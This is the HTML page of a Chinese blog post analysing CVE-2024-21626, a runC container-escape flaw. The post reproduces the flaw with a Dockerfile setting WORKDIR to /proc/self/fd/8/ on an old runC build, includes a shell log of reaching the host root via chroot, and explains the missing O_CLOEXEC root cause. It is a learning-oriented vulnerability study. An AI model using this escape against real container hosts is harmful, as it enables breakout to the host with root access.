@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="color-scheme" content="light dark">
+    <meta name="generator" content="Typst">
+    <title>漏洞分析之 CVE-2024-21626 | weyung's Blog</title>
+    <meta name="date" content="2025-03-03">
+    <link rel="canonical" href="https://weyung.cc/posts/98d4da2d/">
+    <meta property="og:title" content="漏洞分析之 CVE-2024-21626 | weyung's Blog">
+    <meta property="og:type" content="article">
+    <meta name="description" content="研究一下 Docker 的 CVE。">
+    <meta property="og:description" content="研究一下 Docker 的 CVE。">
+    <meta property="og:url" content="https://weyung.cc/posts/98d4da2d/">
+    <meta name="author" content="weyung">
+    <meta property="article:author" content="weyung">
+    <meta name="twitter:card" content="summary">
+    <meta name="language" content="zh">
+    <link rel="icon" href="/assets/avatar.png">
+    <link rel="preconnect" href="https://cdn.jsdelivr.net">
+    <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">
+    <script type="text/javascript">
+      (function(){var key='typ-blog-theme';var theme=null;try{var stored=localStorage.getItem(key);if(stored==='gray-10'||stored==='gray-90'||stored==='gray-100'||stored==='white'){theme=stored;}}catch(_){ }if(!theme){theme=window.matchMedia('(prefers-color-scheme: dark)').matches?'gray-90':'gray-10';}document.documentElement.setAttribute('data-theme',theme);var bg=theme==='gray-90'?'#262626':theme==='gray-100'?'#161616':theme==='white'?'#ffffff':'#f4f4f4';document.documentElement.style.backgroundColor=bg;})();
+    </script>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-sans@1.1.0/css/ibm-plex-sans-all.min.css">
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@ibm/plex-mono@1.1.0/css/ibm-plex-mono-all.min.css">
+    <link rel="stylesheet" href="/assets/core/colors.css">
+    <link rel="stylesheet" href="/assets/core/main.css">
+    <link rel="stylesheet" href="/assets/custom.css">
+    <link rel="stylesheet" href="/assets/custom-toc.css">
+    <script type="module" src="/assets/core/render-code.js"></script>
+    <script type="module" src="/assets/core/theme.js"></script>
+    <script type="module" src="/assets/core/post-nav-switch.js"></script>
+    <script type="module" src="/assets/custom-toc.js"></script>
+  </head>
+  <body>
+    <div class="page-shell">
+      <header>
+        <div class="site-header">
+          <div class="nav-shell">
+            <nav>
+              <button class="nav-menu-switch" type="button" aria-label="打开导航"></button>
+              <div class="nav-title">weyung's Blog</div>
+              <div class="nav-body has-post-title">
+                <div class="nav-body-upper">
+                  <div class="nav-body-upper-title">weyung's Blog</div>
+                  <div class="nav-body-upper-links"><a href="/">首页</a><a href="/categories/">分类</a><a href="/tags/">标签</a><a href="/archive/">归档</a><a href="/links/">友链</a><a href="/about/">关于</a></div>
+                </div>
+                <div class="nav-body-lower">漏洞分析之 CVE-2024-21626</div>
+              </div>
+              <button class="nav-theme-switch" type="button" aria-label="切换主题"></button>
+            </nav>
+            <div class="nav-sidebar-backdrop"></div>
+            <aside class="nav-sidebar"><a class="nav-sidebar-item" href="/">首页</a><a class="nav-sidebar-item" href="/categories/">分类</a><a class="nav-sidebar-item" href="/tags/">标签</a><a class="nav-sidebar-item" href="/archive/">归档</a><a class="nav-sidebar-item" href="/links/">友链</a><a class="nav-sidebar-item" href="/about/">关于</a></aside>
+          </div>
+        </div>
+      </header>
+      <div class="post-header">
+        <div class="post-header-inner">
+          <h1>漏洞分析之 CVE-2024-21626</h1>
+        </div>
+      </div>
+      <article>
+        <section>
+          <h3>前置知识</h3>
+          <h4>什么是 Docker</h4>
+          <p>相信读这篇文章的大部分人都知道 Docker 是什么，但不一定能背出这种八股问题。</p>
+          <p>Deepseek 给出的回答是：Docker 是一种开源的容器化平台，用于快速构建、打包、部署和运行应用程序。它的核心思想是通过容器技术，将应用及其依赖环境（如库、配置等）打包成一个轻量级、可移植的镜像，从而实现 <strong>“一次构建，处处运行”</strong>。</p>
+          <h4>什么是 runC</h4>
+          <p>runC 是一个开源的容器运行时，是 Docker 的一部分，用于创建和运行容器。runC 是一个轻量级的工具，它实现了 <a href="https://opencontainers.org/" target="_blank" rel="noopener noreferrer">OCI</a> 标准，可以在任何 OCI 兼容的容器运行时中使用。</p>
+          <h3>复现</h3>
+          <p>用 WSL 一直复现不出来，WSL 的情况很奇怪，<code class="language-text">docker version</code> 能看到 runc 版本是老的，但是直接执行 <code class="language-text">runc</code> 又没有这条命令。</p>
+          <p>尝试了很多次实在不行了，换 VMWare 里搞搞</p>
+          <p>新建了个 Ubuntu 20.04 的虚拟机，选择 Minimal Installation，不要浏览器之类乱七八糟的东西。</p>
+          <p>学校内网有镜像站，直接换个源起飞。</p>
+          <pre><code class="language-bash">sudo rm /etc/apt/sources.list   # 要备份就 mv 一下，因为我是新机，就直接删了
+sudo nano /etc/apt/sources.list</code></pre>
+          <p>粘贴后 <code class="language-text">Ctrl + O</code> 保存，<code class="language-text">Ctrl + X</code> 退出。</p>
+          <pre><code class="language-bash">sudo apt update
+sudo apt upgrade</code></pre>
+          <p>这里默认没带 SSH，执行 <code class="language-text">sudo apt install openssh-server</code> 装一下，不然不太习惯 Ubuntu 自带的终端。</p>
+          <p>然后安装 Docker：</p>
+          <pre><code class="language-bash">sudo apt install docker.io</code></pre>
+          <p><code class="language-text">docker version</code> 看一下版本，runc 是新的，还是得自己编译老版本替换。</p>
+          <pre><code class="language-bash">git clone https://github.com/opencontainers/runc
+cd runc
+git checkout v1.1.0-rc.1
+sudo apt install -y build-essential libseccomp-dev   # 不然会报错
+make
+sudo rm -rf $(which runc)
+sudo make install
+sudo systemctl restart docker</code></pre>
+          <p>这个新机 make 和 go 都没有，中途也装了一下，不提。</p>
+          <p>写一个 Dockerfile 如下：</p>
+          <pre><code class="language-Dockerfile">FROM ubuntu
+ 
+# Sets the current working directory for this image
+WORKDIR /proc/self/fd/7/</code></pre>
+          <p>执行 <code class="language-text">docker build . -t test</code>，这里 <code class="language-text">-t</code> 的意思是 tag。</p>
+          <p>再执行 <code class="language-text">docker run --rm -it test bash</code>，这里 <code class="language-text">--rm</code> 可以让容器停止后自动删除容器文件系统，避免手动清理临时容器，一般用于测试，<code class="language-text">-it bash</code> 意思是起一个交互式的 bash shell。</p>
+          <p>说是可能要多执行几次才会成功，但是执行了几十次都不行，把 Dockerfile 的 <code class="language-text">WORKDIR</code> 改成 <code class="language-text">WORKDIR /proc/self/fd/8/</code> 就可以了。</p>
+          <p>OHHHHHHHHH!!!!!!!!!</p>
+          <p>以下是命令执行记录：</p>
+          <pre><code class="language-bash">kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bash
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+root@6e9ec0c97b8f:.# cd ../..
+chdir: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+root@6e9ec0c97b8f:../..# ls
+block  bus  class  dev  devices  firmware  fs  hypervisor  kernel  module  power
+root@6e9ec0c97b8f:../..# pwd
+../..
+root@6e9ec0c97b8f:../..# cd ..
+root@6e9ec0c97b8f:../../..# ls /
+bin  boot  dev  etc  home  lib  lib64  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp  usr  var
+root@6e9ec0c97b8f:../../..# ls /home
+ubuntu
+root@6e9ec0c97b8f:../../..# docker ps
+bash: docker: command not found
+root@6e9ec0c97b8f:../../..# chroot .
+# ls
+bin   cdrom  etc   lib    lib64   lost+found  mnt  proc  run   snap  swapfile  tmp  var
+boot  dev    home  lib32  libx32  media       opt  root  sbin  srv   sys       usr
+# docker ps
+CONTAINER ID   IMAGE     COMMAND   CREATED         STATUS         PORTS     NAMES
+6e9ec0c97b8f   test      "bash"    4 minutes ago   Up 4 minutes             admiring_gates
+# whoami
+root
+# exit
+root@6e9ec0c97b8f:../../..# exit
+exit
+kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test
+[sudo] password for kali:
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+root@21b173949eee:.# exit
+exit
+kali@cverc:~/cve-2024-21626$ sudo docker run --rm -it test bash
+shell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory
+root@d5e014a9425b:.#</code></pre>
+          <p>这里简单提下，<code class="language-text">chroot</code> 是改变根目录的命令，<code class="language-text">chroot .</code> 就是把当前目录作为根目录，这样操作起来就跟宿主机一样了。</p>
+          <h3>原理</h3>
+          <p>还是得先普及几个概念。</p>
+          <h4>什么是 openat()</h4>
+          <p>这是 DeepSeek 的回答：</p>
+          <div class="quote-block">openat() 是 Linux 系统中的一个系统调用，用于以相对路径的方式打开文件或目录，<strong>旨在解决传统 open() 函数在多线程或路径变化场景下的竞争条件问题</strong>。</div>
+          <p>首先我们知道 <code class="language-text">open()</code> 是一个关于文件的系统调用，那么就可以大概理解成 <code class="language-text">openat()</code> 是 <code class="language-text">open()</code> 的一个改良。</p>
+          <h5>关于 open() 函数的条件竞争问题</h5>
+          <p>这个属于题外话，感兴趣的朋友可以看一下，不感兴趣的直接往下过就行。</p>
+          <p><em>条件竞争有些情景也叫竞态条件，可以大致理解成一回事。</em></p>
+          <p>我们可以用一个简单的例子来说明这个问题，先在 <code class="language-text">/tmp/dir1</code> 和 <code class="language-text">/tmp/dir2</code> 下分别创建一个文件 <code class="language-text">test.txt</code>，命令如下：</p>
+          <pre><code class="language-bash">mkdir -p /tmp/dir1 /tmp/dir2 &amp;&amp; \
+echo "This is /tmp/dir1/test.txt" > /tmp/dir1/test.txt &amp;&amp; \
+echo "This is /tmp/dir2/test.txt" > /tmp/dir2/test.txt</code></pre>
+          <p>然后写一个简单的 C 代码：</p>
+          <pre><code class="language-c">#include &lt;stdio.h>
+#include &lt;stdlib.h>
+#include &lt;unistd.h>
+#include &lt;fcntl.h>
+#include &lt;pthread.h>
+
+const char *filename = "test.txt";
+
+// 线程 A：循环切换当前工作目录
+void *switch_directory(void *arg) {
+    while (1) {
+        // 在三个目录之间来回切换
+        chdir("/tmp/dir1");
+        chdir("/tmp/dir2");
+        chdir("/var");
+    }
+    return NULL;
+}
+
+// 线程 B：尝试打开文件
+void *open_file(void *arg) {
+    while (1) {
+        // 尝试以只读方式打开文件（假设文件存在于某目录下）
+        int fd = open(filename, O_RDONLY);
+        if (fd == -1) {
+            perror("open failed");
+        } else {
+            printf("open succeeded\n");
+            // 输出文件内容
+            char buf[1024];
+            ssize_t n = read(fd, buf, sizeof(buf));
+            if (n == -1) {
+                perror("read failed");
+            } else {
+                buf[n] = '\0';
+                printf("read: %s\n", buf);
+            }
+            close(fd);
+        }
+        usleep(1000000); // 短暂延迟
+    }
+    return NULL;
+}
+
+int main() {
+    pthread_t t1, t2;
+    pthread_create(&amp;t1, NULL, switch_directory, NULL);
+    pthread_create(&amp;t2, NULL, open_file, NULL);
+    pthread_join(t1, NULL);
+    pthread_join(t2, NULL);
+    return 0;
+}</code></pre>
+          <p>编译并运行这个程序：</p>
+          <pre><code class="language-bash">gcc -o race_condition_test race_condition_test.c -lpthread &amp;&amp; ./race_condition_test</code></pre>
+          <p>可以看到执行结果如下：</p>
+          <pre><code class="language-plain">open succeeded
+read: This is /tmp/dir2/test.txt
+
+open failed: No such file or directory
+open failed: No such file or directory
+open succeeded
+read: This is /tmp/dir2/test.txt
+
+open succeeded
+read: This is /tmp/dir2/test.txt
+
+open failed: No such file or directory
+open succeeded
+read: This is /tmp/dir1/test.txt
+
+open succeeded
+read: This is /tmp/dir1/test.txt
+
+open succeeded
+read: This is /tmp/dir2/test.txt
+
+open failed: No such file or directory</code></pre>
+          <p>读者稍加理解上以代码和运行结果就可以发现，<code class="language-text">open()</code> 函数容易受到 CWD（Current Working Directory，当前工作目录）的影响，若多个线程同时调用 <code class="language-text">chdir()</code> 修改全局 CWD，并依赖相对路径调用 <code class="language-text">open()</code>，其他线程的后续 <code class="language-text">open()</code> 操作就可能因 CWD 被意外修改而解析到错误路径。</p>
+          <p>这个时候 <code class="language-text">openat()</code> 就来了，man 官网上关于 <code class="language-text">open</code> 家族的函数的描述如下：</p>
+          <pre><code class="language-c">#include &lt;fcntl.h>
+
+int open(const char *pathname, int flags, ...
+            /* mode_t mode */ );
+
+int creat(const char *pathname, mode_t mode);
+
+int openat(int dirfd, const char *pathname, int flags, ...
+            /* mode_t mode */ );
+
+/* Documented separately, in openat2(2): */
+int openat2(int dirfd, const char *pathname,
+            const struct open_how *how, size_t size);</code></pre>
+          <p>可以看到，<code class="language-text">openat()</code> 函数比 <code class="language-text">open()</code> 多了一个 <code class="language-text">dirfd</code> 参数，这个参数是一个文件描述符，用于指定相对路径的起始目录，而不是依赖全局 CWD，这样就避免的 <code class="language-text">open()</code> 函数的条件竞争问题。</p>
+          <p>demo 如下：</p>
+          <pre><code class="language-c">int dirfd = open("/home", O_RDONLY | O_DIRECTORY);
+int fd = openat(dirfd, filename, O_RDONLY);</code></pre>
+          <p>具体的对比测试就不做了，反正肯定可以解决上面的问题的（不然搞来干嘛 hhh</p>
+          <h5>openat() | openat(2) | openat2() | openat2(2) 的区别</h5>
+          <p>在搜索的过程中，这几个玩意都有出现，给我绕晕了。</p>
+          <p>吐槽一下，nitroc 的文章里面一会 <code class="language-text">openat(2)</code> 一会 <code class="language-text">openat2(2)</code> 的，一切换成他的英文版本又全是 <code class="language-text">openat2(2)</code>，不是哥们你能不能好好写文章，有点逆天了。</p>
+          <p>这块问了下 DeepSeek，然后自己试了一下，大概得出的结论如下：</p>
+          <p>先说 <code class="language-text">openat()</code> 和 <code class="language-text">openat2()</code>，首先上面的文档比较明显地看到 <code class="language-text">openat()</code> 和 <code class="language-text">openat2()</code> 在参数上的区别，<code class="language-text">openat()</code> 采用的还是传统的 flags，而 <code class="language-text">openat2()</code> 采用的是 <code class="language-text">struct open_how</code> 结构体，可以说 <code class="language-text">openat2()</code> 是 <code class="language-text">openat()</code> 的一个扩展，具体不作展开，读者有兴趣可以自行查阅相关文档。</p>
+          <p>那 <code class="language-text">openat(2)</code> 和 <code class="language-text">openat2(2)</code> 又是什么呢？经过我的测试，结论有点无语，这个 2 指的是 Linux 手册页第 2 部分，执行命令 <code class="language-text">man 2 openat</code> 可以在本地看到相关文档，翻到最后，有个</p>
+          <pre><code class="language-plain">SEE ALSO
+       chmod(2), chown(2), close(2), dup(2), fcntl(2), link(2), lseek(2), mknod(2), mmap(2),  mount(2),  open_by_handle_at(2),  ope‐
+       nat2(2), read(2), socket(2), stat(2), umask(2), unlink(2), write(2), fopen(3), acl(5), fifo(7), inode(7), path_resolution(7),
+       symlink(7)</code></pre>
+          <p>不信邪的读者可以执行 <code class="language-text">man 7 fifo</code>，就能看到相关文档，但是执行 <code class="language-text">man 2 fifo</code>，即在第 7 部分以外的地方查找，就会提示 <code class="language-text">No manual entry for fifo in section 2</code>，其他命令类似。</p>
+          <h4>什么是 Cgroups</h4>
+          <p>以下是 DeepSeek 的回答：</p>
+          <p>Cgroups（Control Groups） 是 Linux 内核提供的一种机制，用于对系统资源（如 CPU、内存、磁盘 I/O、网络等）进行分组管理和限制。它通过将进程及其子进程组织成层级化的“控制组”，实现对不同进程组的资源分配、优先级调整和监控。</p>
+          <p>那么说人话就是，<strong>Cgroups 是用来调控资源的使用的。</strong></p>
+          <p>Docker 通过 Namespace 实现了容器的<strong>隔离</strong>，通过 Cgroups 实现了容器的<strong>资源限制</strong>，太有意思了。</p>
+          <h4>Docker 运行流程</h4>
+          <pre><code class="language-plain">用户操作层
+  ├── docker-client (CLI)
+  └── dockerd (守护进程)
+          │
+容器管理层
+  └── containerd
+          │
+容器运行时层
+  ├── containerd-shim (管理单个容器)
+  └── runc (实际创建容器)
+          │
+容器内部
+  └── container-entrypoint (容器入口命令)</code></pre>
+          <p>现在我们可以系统地观察一下 Docker 启用一个容器的流程了，再补充一个热知识：dockerd 后面的 d 指的是 daemon，守护进程的意思，containerd 后面的 d 同理，sshd 等平时应该也见过。</p>
+          <p>containerd-shim 则是 containerd 的一个子进程，负责管理单个容器的生命周期，<strong>与容器是一一对应的关系</strong>。从 shim 的英文意思（垫片）可以看出，是一个连接 containerd 和 runc 的桥梁，避免单个容器的异常影响整个 containerd 的运行。</p>
+          <h4>为什么会产生这个漏洞</h4>
+          <p>观察 Cgroups 关于这个漏洞的修复</p>
+          <p><a href="https://github.com/opencontainers/cgroups/commit/8f731c2c1785c565ac665fcc309e87b31305bea2" target="_blank" rel="noopener noreferrer">https://github.com/opencontainers/cgroups/commit/8f731c2c1785c565ac665fcc309e87b31305bea2</a></p>
+          <p>可以很明显地发现关于 <code class="language-text">openat2()</code> 的调用产生如下变化：</p>
+          <pre><code class="language-go">- Flags: unix.O_DIRECTORY | unix.O_PATH,
++ Flags: unix.O_DIRECTORY | unix.O_PATH | unix.O_CLOEXEC,</code></pre>
+          <p>可以看到之前是不带 <code class="language-text">O_CLOEXEC</code> 的，<code class="language-text">O_CLOEXEC</code> 是一个标志位，全称 Close-on-Exec，核心作用是在进程调用 exec 系列函数（如 execve）执行新程序时，自动关闭当前打开的文件描述符，从而避免子进程继承不必要的资源。</p>
+          <p><code class="language-text">prepareOpenat2()</code> 函数会测试一下 <code class="language-text">openat2()</code> 能不能用，因为 <code class="language-text">openat2()</code> 是 Linux 5.6 版本才有的，<strong>但是由于没加 <code class="language-text">O_CLOEXEC</code>，这个测试不会把打开过的主机 <code class="language-text">/sys/fs/cgroup</code> 的 fd 关掉</strong>，以至于子进程仍然可以访问这个 fd，最终导致逃逸的发生。</p>
+          <p>那为什么 <code class="language-text">/sys/fs/cgroup</code> 的文件描述符是 8 呢，根据文章的说法，这个与 Golang 运行时有关系，我们知道 0 是 stdin，1 是 stdout，2 是 stderr，然后一些日志啥的会用到 fd，排队排到 <code class="language-text">/sys/fs/cgroup</code> 的时候就变成 8 了。</p>
+          <h3>总结</h3>
+          <p>算是比较系统地了解了一下 Docker，复现 CVE 真的能学到东西的。</p>
+          <h3>参考</h3>
+          <p><a href="https://nitroc.org/posts/cve-2024-21626-illustrated" target="_blank" rel="noopener noreferrer">https://nitroc.org/posts/cve-2024-21626-illustrated</a> <a href="https://www.manjusaka.blog/posts/2024/02/10/CVE-2024-21626/index.html" target="_blank" rel="noopener noreferrer">https://www.manjusaka.blog/posts/2024/02/10/CVE-2024-21626/index.html</a> <a href="https://blog.csdn.net/qq_42931917/article/details/131468557" target="_blank" rel="noopener noreferrer">https://blog.csdn.net/qq_42931917/article/details/131468557</a> <a href="https://man7.org/linux/man-pages/man2/open.2.html" target="_blank" rel="noopener noreferrer">https://man7.org/linux/man-pages/man2/open.2.html</a> <a href="https://github.com/opencontainers/cgroups/blob/2a61babab3b079d757796fb543bf91400d15d4b9/file.go#L110" target="_blank" rel="noopener noreferrer">https://github.com/opencontainers/cgroups/blob/2a61babab3b079d757796fb543bf91400d15d4b9/file.go#L110</a></p>
+          <div class="post-meta">
+            <div class="post-tag"><span class="post-tag-desc">标签</span><span class="post-tag-group"><a class="post-tag-item tag-item-with-icon" href="/tags/web/" style="--tag-background:var(--tag-background-purple);--tag-color:var(--tag-color-purple);--tag-background-hover:var(--tag-hover-purple);--tag-border:var(--tag-border-purple);--tag-border-hover:var(--tag-border-purple);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-globe.svg&quot;);"></span><span class="tag-content"><span>Web</span></span></a><a class="post-tag-item tag-item-with-icon" href="/tags/渗透/" style="--tag-background:var(--tag-background-teal);--tag-color:var(--tag-color-teal);--tag-background-hover:var(--tag-hover-teal);--tag-border:var(--tag-border-teal);--tag-border-hover:var(--tag-border-teal);"><span class="tag-icon" style="mask-image:url(&quot;/assets/icons/tag-lucide-sword.svg&quot;);"></span><span class="tag-content"><span>渗透</span></span></a></span></div>
+            <div class="post-time"><span class="post-time-desc">日期</span><span>2025 年 3 月 3 日</span></div>
+            <div class="post-category"><span class="post-category-desc">分类</span><a class="post-category-link" href="/categories/cve/">CVE</a></div>
+          </div>
+          <div class="post-license">
+            <div class="post-license-item"><span class="post-license-label">文章作者</span><span>weyung</span></div>
+            <div class="post-license-item"><span class="post-license-label">文章链接</span><a href="https://weyung.cc/posts/98d4da2d/">https://weyung.cc/posts/98d4da2d/</a></div>
+            <div class="post-license-item"><span class="post-license-label">许可协议</span><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener noreferrer">CC BY-NC-SA 4.0</a></div>
+          </div>
+        </section>
+      </article>
+      <div class="post-neighbors">
+        <div class="post-neighbors-inner"><a class="post-neighbor" href="/posts/786bcd69/"><div class="post-neighbor-top">上一篇</div><p class="post-neighbor-title">2025 CISCN &amp; CCB - Crypto</p></a><a class="post-neighbor" href="/posts/535b1aa9/"><div class="post-neighbor-top">下一篇</div><p class="post-neighbor-title">2025 红明谷杯 - Crypto</p></a></div>
+      </div>
+      <footer>
+        <div class="post-footer">2026 ~ Present Carbon Typst Blog</div>
+      </footer>
+    </div>
+  </body>
+</html>
